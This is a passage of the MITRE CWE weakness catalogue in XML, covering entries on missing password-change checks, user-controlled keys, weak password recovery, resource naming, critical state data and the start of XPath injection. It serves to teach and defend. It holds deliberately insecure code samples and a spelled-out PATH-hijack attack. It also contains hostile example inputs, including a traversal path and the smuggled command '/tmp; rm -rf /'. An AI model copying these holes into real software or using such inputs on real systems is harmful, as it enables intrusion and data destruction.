                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">SetUserPassword($user, $pass);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0944</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         
      </Weakness>
      <Weakness ID="639" Name="Authorization Bypass Through User-Controlled Key" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.</Description>
         <Extended_Description>
            <xhtml:p>Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.</xhtml:p>
            <xhtml:p>For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.</xhtml:p>
            <xhtml:p>One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference</Term>
               <Description>The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Horizontal Authorization</Term>
               <Description>"Horizontal Authorization" is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to resources in a multi-user context.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Access control checks for specific user data or functionality can be bypassed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Horizontal escalation of privilege is possible (one user can view/modify information of another user).</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="640" Name="Weak Password Recovery Mechanism for Forgotten Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.</Description>
         <Extended_Description>
            <xhtml:p>It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.</xhtml:p>
            <xhtml:p>This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>The system's security functionality is turned against the system by the attacker.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use standard weak security questions and use several security questions.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Assign a new temporary password rather than revealing the original password.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>49</Entry_ID>
               <Entry_Name>Insufficient Password Recovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="50"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry might be reclassified as a category or "loose composite," since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password).</Note>
            <Note Type="Maintenance">This entry probably needs to be split; see extended description.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="641" Name="Improper Restriction of Names for Files and Other Resources" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The application constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.</Description>
         <Extended_Description>This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="99" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="99" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Execution of arbitrary code in the context of usage of the resources with dangerous names.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>Crash of the consumer code of these resources resulting in information leakage or denial of service.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not allow users to control names of resources used on the server side.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Perform whitelist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="642" Name="External Control of Critical State Data" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software stores security-critical state information about its users, or the software itself, in a location that is accessible to unauthorized actors.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.</xhtml:p>
            <xhtml:p>State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an "authenticated=true" cookie. An attacker may simply create this cookie in order to bypass the authentication.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The state variables may contain sensitive information that should not be known by the client.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>By modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-14">
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store state information and sensitive data on the server side only.</xhtml:p>
                  <xhtml:p>Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</xhtml:p>
                  <xhtml:p>If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>With a stateless protocol such as HTTP, use some frameworks can maintain the state for you.</xhtml:p>
                  <xhtml:p>Examples include ASP.NET View State and the OWASP ESAPI Session Management feature.</xhtml:p>
                  <xhtml:p>Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:10px;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-65">
               <Intro_Text>The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files (CWE-22).</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-66">
               <Intro_Text>The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>fis = new FileInputStream(cfg.getProperty("sub")+".txt");<xhtml:br/>amt = fis.read(arr);<xhtml:br/>out.println(arr);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-67">
               <Intro_Text>This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#define DIR "/restricted/directory"<xhtml:br/>
                     <xhtml:br/>char cmd[500];<xhtml:br/>sprintf(cmd, "ls -l %480s", DIR);<xhtml:br/>
                     <xhtml:i>/* Raise privileges to those needed for accessing DIR. */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>RaisePrivileges(...);<xhtml:br/>system(cmd);<xhtml:br/>DropPrivileges(...);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.</Body_Text>
               <Body_Text>However, because the program does not modify the PATH environment variable, the following attack would work:</Body_Text>
               <Body_Text>
                  <xhtml:div>
                     <xhtml:div>The user sets the PATH to reference a directory under that user's control, such as "/my/dir/".</xhtml:div>
                     <xhtml:div>The user creates a malicious program called "ls", and puts that program in /my/dir</xhtml:div>
                     <xhtml:div>The user executes the program.</xhtml:div>
                     <xhtml:div>When system() is executed, the shell consults the PATH to find the ls program</xhtml:div>
                     <xhtml:div>The program finds the malicious program, "/my/dir/ls". It doesn't find "/bin/ls" because PATH does not contain "/bin/".</xhtml:div>
                     <xhtml:div>The program executes the malicious program with the raised privileges.</xhtml:div>
                  </xhtml:div>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-68">
               <Intro_Text>This code prints all of the running processes belonging to the current user.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78)</xhtml:i>
                     <xhtml:br/>$userName = getCurrentUser();<xhtml:br/>$command = 'ps aux | grep ' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>This program is also vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code segment implements a basic server that uses the "ls" program to perform a directory listing of the directory that is listed in the "HOMEDIR" environment variable. The code intends to allow the user to specify an alternate "LANG" environment variable. This causes "ls" to customize its output based on a given language, which is an important capability when supporting internationalization.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>$ENV{"HOMEDIR"} = "/home/mydir/public/";<xhtml:br/>my $stream = AcceptUntrustedInputStream();<xhtml:br/>while (&lt;$stream&gt;) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>chomp;<xhtml:br/>if (/^ENV ([\w\_]+) (.*)/) {<xhtml:div style="margin-left:10px;">$ENV{$1} = $2;</xhtml:div>}<xhtml:br/>elsif (/^QUIT/) { ... }<xhtml:br/>elsif (/^LIST/) {<xhtml:div style="margin-left:10px;">open($fh, "/bin/ls -l $ENV{HOMEDIR}|");<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">SendOutput($stream, "FILEINFO: $_");</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer takes care to call a specific "ls" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as "ENV HOMEDIR /secret/directory" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as "/tmp; rm -rf /". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be a whitelist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed.</Body_Text>
               <Body_Text>While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-2428</Reference>
               <Description>Mail client stores password hashes for unrelated accounts in a hidden form field.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2428</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0306</Reference>
               <Description>Privileged program trusts user-specified environment variable to modify critical configuration settings.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0306</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0073</Reference>
               <Description>Telnet daemon allows remote clients to specify critical environment variables for the server, leading to code execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4432</Reference>
               <Description>Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4432</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7191</Reference>
               <Description>Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7191</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5738</Reference>
               <Description>Calendar application allows bypass of authentication by setting a certain cookie value to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5738</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5642</Reference>
               <Description>Setting of a language preference in a cookie enables path traversal attack.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5642</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5125</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5125</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5065</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5065</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4752</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0102</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0102</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0253</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1319</Reference>
               <Description>Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1319</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-528"/>
            <Reference External_Reference_ID="REF-529"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 4: Use of Magic URLs, Predictable Cookies, and Hidden Form&#xA;                  Fields.&#34; Page 75"/>
         </References>
         
      </Weakness>
      <Weakness ID="643" Name="Improper Neutralization of Data within XPath Expressions ('XPath Injection')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</Description>
         <Extended_Description>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="699"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Controlling application flow (e.g. bypassing authentication).</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
